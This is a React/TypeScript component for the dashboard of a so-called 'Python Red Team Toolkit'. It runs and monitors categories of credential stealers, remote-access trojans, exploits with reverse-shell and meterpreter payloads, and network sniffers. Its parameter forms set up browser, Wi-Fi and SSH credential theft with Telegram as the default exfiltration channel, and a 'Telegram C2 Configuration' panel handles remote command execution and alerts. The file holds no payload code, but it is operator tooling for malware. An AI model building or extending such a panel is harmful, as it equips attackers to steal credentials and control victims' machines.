import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { 
  Terminal, 
  Play, 
  Square, 
  Download, 
  Settings, 
  Activity,
  Zap,
  Shield,
  Network,
  Database,
  AlertTriangle,
  CheckCircle,
  Send
} from "lucide-react";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";

interface PythonTool {
  id: string;
  name: string;
  description: string;
  script: string;
  category: 'sniffer' | 'stealer' | 'rat' | 'exploit' | 'recon';
  status: 'idle' | 'running' | 'completed' | 'failed';
  lastRun?: Date;
  telegramEnabled: boolean;
}

interface ToolExecution {
  id: string;
  toolId: string;
  status: 'running' | 'completed' | 'failed';
  output: string;
  startTime: Date;
  endTime?: Date;
  telegramAlerts: boolean;
}

interface TelegramConfig {
  botToken: string;
  chatId: string;
  alertsEnabled: boolean;
}

export default function PythonToolkitManager() {
  const [selectedTool, setSelectedTool] = useState<string>('');
  const [toolParameters, setToolParameters] = useState<Record<string, string>>({});
  const [executionOutput, setExecutionOutput] = useState<string>('');
  const [telegramConfig, setTelegramConfig] = useState<TelegramConfig>({
    botToken: '',
    chatId: '',
    alertsEnabled: false
  });
  const [showTelegramConfig, setShowTelegramConfig] = useState(false);

  const queryClient = useQueryClient();

  // Fetch available Python tools
  const { data: tools = [], isLoading } = useQuery({
    queryKey: ['python-tools'],
    queryFn: async () => {
      const response = await fetch('/api/admin/python-tools');
      if (!response.ok) throw new Error('Failed to fetch tools');
      return response.json();
    },
    refetchInterval: 5000 // Refresh every 5 seconds
  });

  // Fetch active executions
  const { data: executions = [] } = useQuery({
    queryKey: ['tool-executions'],
    queryFn: async () => {
      const response = await fetch('/api/admin/tool-executions');
      if (!response.ok) throw new Error('Failed to fetch executions');
      return response.json();
    },
    refetchInterval: 2000 // Refresh every 2 seconds for real-time updates
  });

  // Execute tool mutation
  const executeTool = useMutation({
    mutationFn: async (params: { toolId: string; parameters: Record<string, string>; telegramConfig?: TelegramConfig }) => {
      const response = await fetch('/api/admin/execute-tool', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(params)
      });
      if (!response.ok) throw new Error('Failed to execute tool');
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['tool-executions'] });
      setExecutionOutput('Tool execution started...');
    }
  });

  // Stop execution mutation
  const stopExecution = useMutation({
    mutationFn: async (executionId: string) => {
      const response = await fetch(`/api/admin/stop-execution/${executionId}`, {
        method: 'POST'
      });
      if (!response.ok) throw new Error('Failed to stop execution');
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['tool-executions'] });
    }
  });

  // Configure Telegram integration
  const configureTelegram = useMutation({
    mutationFn: async (config: TelegramConfig) => {
      const response = await fetch('/api/admin/configure-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config)
      });
      if (!response.ok) throw new Error('Failed to configure Telegram');
      return response.json();
    },
    onSuccess: () => {
      setShowTelegramConfig(false);
    }
  });

  const handleExecuteTool = () => {
    if (!selectedTool) return;

    const params = {
      toolId: selectedTool,
      parameters: toolParameters,
      telegramConfig: telegramConfig.alertsEnabled ? telegramConfig : undefined
    };

    executeTool.mutate(params);
  };

  const handleStopExecution = (executionId: string) => {
    stopExecution.mutate(executionId);
  };

  const getCategoryIcon = (category: string) => {
    switch (category) {
      case 'sniffer': return <Network className="w-4 h-4" />;
      case 'stealer': return <Database className="w-4 h-4" />;
      case 'rat': return <Terminal className="w-4 h-4" />;
      case 'exploit': return <Zap className="w-4 h-4" />;
      case 'recon': return <Shield className="w-4 h-4" />;
      default: return <Activity className="w-4 h-4" />;
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'running': return 'bg-yellow-500/20 text-yellow-400';
      case 'completed': return 'bg-green-500/20 text-green-400';
      case 'failed': return 'bg-red-500/20 text-red-400';
      default: return 'bg-gray-500/20 text-gray-400';
    }
  };

  const renderToolParameters = () => {
    const tool = tools.find((t: PythonTool) => t.id === selectedTool);
    if (!tool) return null;

    const commonParams = {
      'sniffer': [
        { key: 'interface', label: 'Network Interface', type: 'text', default: 'all' },
        { key: 'duration', label: 'Duration (seconds)', type: 'number', default: '300' },
        { key: 'protocols', label: 'Protocols', type: 'text', default: 'HTTP,HTTPS,FTP' }
      ],
      'stealer': [
        { key: 'modules', label: 'Collection Modules', type: 'text', default: 'browser,wifi,ssh' },
        { key: 'exfiltrate', label: 'Exfiltration Method', type: 'select', options: ['telegram', 'http', 'file'], default: 'telegram' }
      ],
      'rat': [
        { key: 'port', label: 'C2 Port', type: 'number', default: '8888' },
        { key: 'interface', label: 'Bind Interface', type: 'text', default: '0.0.0.0' }
      ],
      'exploit': [
        { key: 'target', label: 'Target IP/Range', type: 'text', default: '192.168.1.0/24' },
        { key: 'payload', label: 'Payload Type', type: 'select', options: ['reverse_shell', 'bind_shell', 'meterpreter'], default: 'reverse_shell' }
      ],
      'recon': [
        { key: 'target', label: 'Target', type: 'text', default: 'localhost' },
        { key: 'scan_type', label: 'Scan Type', type: 'select', options: ['fast', 'full', 'stealth'], default: 'fast' }
      ]
    };

    const params = commonParams[tool.category as keyof typeof commonParams] || [];

    return (
      <div className="space-y-4">
        {params.map((param) => (
          <div key={param.key} className="space-y-2">
            <label className="text-sm font-medium text-matrix">{param.label}</label>
            {param.type === 'select' ? (
              <Select 
                value={toolParameters[param.key] || param.default}
                onValueChange={(value) => setToolParameters(prev => ({ ...prev, [param.key]: value }))}
              >
                <SelectTrigger className="bg-terminal border-matrix/30">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {param.options?.map((option) => (
                    <SelectItem key={option} value={option}>{option}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            ) : (
              <Input
                type={param.type}
                value={toolParameters[param.key] || param.default}
                onChange={(e) => setToolParameters(prev => ({ ...prev, [param.key]: e.target.value }))}
                className="bg-terminal border-matrix/30 text-matrix"
                placeholder={param.default}
              />
            )}
          </div>
        ))}
      </div>
    );
  };

  if (isLoading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-matrix">Loading toolkit...</div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Telegram Configuration */}
      {showTelegramConfig && (
        <Card className="bg-panel border-matrix/20">
          <CardHeader>
            <CardTitle className="text-matrix flex items-center">
              <Send className="w-5 h-5 mr-2" />
              Telegram C2 Configuration
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <label className="text-sm font-medium text-matrix">Bot Token</label>
              <Input
                type="password"
                value={telegramConfig.botToken}
                onChange={(e) => setTelegramConfig(prev => ({ ...prev, botToken: e.target.value }))}
                className="bg-terminal border-matrix/30 text-matrix"
                placeholder="Enter Telegram bot token"
              />
            </div>
            <div className="space-y-2">
              <label className="text-sm font-medium text-matrix">Chat ID</label>
              <Input
                value={telegramConfig.chatId}
                onChange={(e) => setTelegramConfig(prev => ({ ...prev, chatId: e.target.value }))}
                className="bg-terminal border-matrix/30 text-matrix"
                placeholder="Enter chat ID for alerts"
              />
            </div>
            <div className="flex items-center space-x-2">
              <input
                type="checkbox"
                checked={telegramConfig.alertsEnabled}
                onChange={(e) => setTelegramConfig(prev => ({ ...prev, alertsEnabled: e.target.checked }))}
                className="rounded border-matrix/30"
              />
              <label className="text-sm text-matrix">Enable real-time alerts</label>
            </div>
            <div className="flex space-x-2">
              <Button
                onClick={() => configureTelegram.mutate(telegramConfig)}
                disabled={configureTelegram.isPending}
                className="bg-matrix/20 hover:bg-matrix/30 text-matrix border-matrix/30"
              >
                Save Configuration
              </Button>
              <Button
                variant="outline"
                onClick={() => setShowTelegramConfig(false)}
                className="border-matrix/30 text-matrix"
              >
                Cancel
              </Button>
            </div>
          </CardContent>
        </Card>
      )}

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Tool Selection and Configuration */}
        <Card className="bg-panel border-matrix/20">
          <CardHeader>
            <CardTitle className="text-matrix flex items-center justify-between">
              <div className="flex items-center">
                <Terminal className="w-5 h-5 mr-2" />
                Python Red Team Toolkit
              </div>
              <Button
                variant="outline"
                size="sm"
                onClick={() => setShowTelegramConfig(true)}
                className="border-matrix/30 text-matrix"
              >
                <Send className="w-4 h-4 mr-1" />
                Telegram
              </Button>
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <label className="text-sm font-medium text-matrix">Select Tool</label>
              <Select value={selectedTool} onValueChange={setSelectedTool}>
                <SelectTrigger className="bg-terminal border-matrix/30">
                  <SelectValue placeholder="Choose a red team tool" />
                </SelectTrigger>
                <SelectContent>
                  {tools.map((tool: PythonTool) => (
                    <SelectItem key={tool.id} value={tool.id}>
                      <div className="flex items-center space-x-2">
                        {getCategoryIcon(tool.category)}
                        <span>{tool.name}</span>
                        <Badge variant="outline" className="ml-2">
                          {tool.category}
                        </Badge>
                      </div>
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            {selectedTool && (
              <>
                <div className="p-3 bg-terminal rounded border border-matrix/30">
                  <p className="text-sm text-gray-300">
                    {tools.find((t: PythonTool) => t.id === selectedTool)?.description}
                  </p>
                </div>

                {renderToolParameters()}

                <div className="flex space-x-2">
                  <Button
                    onClick={handleExecuteTool}
                    disabled={executeTool.isPending}
                    className="bg-matrix/20 hover:bg-matrix/30 text-matrix border-matrix/30 flex-1"
                  >
                    <Play className="w-4 h-4 mr-2" />
                    {executeTool.isPending ? 'Executing...' : 'Execute Tool'}
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => setExecutionOutput('')}
                    className="border-matrix/30 text-matrix"
                  >
                    Clear
                  </Button>
                </div>
              </>
            )}
          </CardContent>
        </Card>

        {/* Real-time Execution Monitor */}
        <Card className="bg-panel border-matrix/20">
          <CardHeader>
            <CardTitle className="text-matrix flex items-center">
              <Activity className="w-5 h-5 mr-2" />
              Active Operations
              <Badge className="ml-2 bg-matrix/20 text-matrix">
                {executions.filter((e: ToolExecution) => e.status === 'running').length} Running
              </Badge>
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-3 max-h-96 overflow-y-auto">
              {executions.length === 0 ? (
                <div className="text-center text-gray-500 py-8">
                  No active operations
                </div>
              ) : (
                executions.map((execution: ToolExecution) => (
                  <div key={execution.id} className="p-3 bg-terminal rounded border border-matrix/30">
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center space-x-2">
                        <Badge className={getStatusColor(execution.status)}>
                          {execution.status === 'running' && <Activity className="w-3 h-3 mr-1 animate-spin" />}
                          {execution.status === 'completed' && <CheckCircle className="w-3 h-3 mr-1" />}
                          {execution.status === 'failed' && <AlertTriangle className="w-3 h-3 mr-1" />}
                          {execution.status.toUpperCase()}
                        </Badge>
                        <span className="text-sm text-matrix">{execution.id}</span>
                      </div>
                      {execution.status === 'running' && (
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => handleStopExecution(execution.id)}
                          className="border-red-500/30 text-red-400 hover:bg-red-500/10"
                        >
                          <Square className="w-3 h-3 mr-1" />
                          Stop
                        </Button>
                      )}
                    </div>
                    <div className="text-xs text-gray-400 mb-1">
                      Started: {new Date(execution.startTime).toLocaleString()}
                      {execution.endTime && (
                        <> | Completed: {new Date(execution.endTime).toLocaleString()}</>
                      )}
                    </div>
                    {execution.output && (
                      <div className="text-xs font-mono text-gray-300 bg-black/20 p-2 rounded max-h-20 overflow-y-auto">
                        {execution.output.split('\n').slice(-5).join('\n')}
                      </div>
                    )}
                    {execution.telegramAlerts && (
                      <div className="flex items-center mt-2 text-xs text-blue-400">
                        <Send className="w-3 h-3 mr-1" />
                        Telegram alerts enabled
                      </div>
                    )}
                  </div>
                ))
              )}
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Tool Categories Overview */}
      <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
        {[
          { category: 'sniffer', label: 'Network Sniffers', icon: Network, count: tools.filter((t: PythonTool) => t.category === 'sniffer').length },
          { category: 'stealer', label: 'Data Stealers', icon: Database, count: tools.filter((t: PythonTool) => t.category === 'stealer').length },
          { category: 'rat', label: 'RAT Tools', icon: Terminal, count: tools.filter((t: PythonTool) => t.category === 'rat').length },
          { category: 'exploit', label: 'Exploit Kits', icon: Zap, count: tools.filter((t: PythonTool) => t.category === 'exploit').length },
          { category: 'recon', label: 'Reconnaissance', icon: Shield, count: tools.filter((t: PythonTool) => t.category === 'recon').length }
        ].map((cat) => (
          <Card key={cat.category} className="bg-panel border-matrix/20">
            <CardContent className="p-4 text-center">
              <cat.icon className="w-8 h-8 mx-auto mb-2 text-matrix" />
              <div className="text-lg font-bold text-matrix">{cat.count}</div>
              <div className="text-xs text-gray-400">{cat.label}</div>
            </CardContent>
          </Card>
        ))}
      </div>

      {/* Advanced Features Alert */}
      <Alert className="border-matrix/20 bg-panel">
        <AlertTriangle className="h-4 w-4" />
        <AlertDescription className="text-matrix">
          <strong>Enhanced Capabilities:</strong> All tools now feature real-time Telegram C2 integration, 
          advanced credential extraction, persistent data collection, and comprehensive network analysis. 
          Configure Telegram for immediate operational alerts and remote command execution.
        </AlertDescription>
      </Alert>
    </div>
  );
}